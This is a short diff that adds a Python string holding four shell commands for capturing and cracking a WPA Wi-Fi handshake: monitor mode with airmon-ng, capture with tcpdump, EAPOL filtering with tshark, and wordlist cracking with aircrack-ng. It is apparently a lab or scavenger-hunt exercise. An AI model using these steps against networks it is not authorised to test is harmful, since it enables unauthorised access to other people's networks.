@@ -1,0 +1,10 @@
+'''
+sudo airmon-ng start wlan1
+
+sudo tcpdump -i wlan1mon -w ./Scav.pcap
+
+tshark -r Scav.pcap -Y 'eapol'
+
+aircrack-ng -w password.lst Scav.pcap
+
+  '''
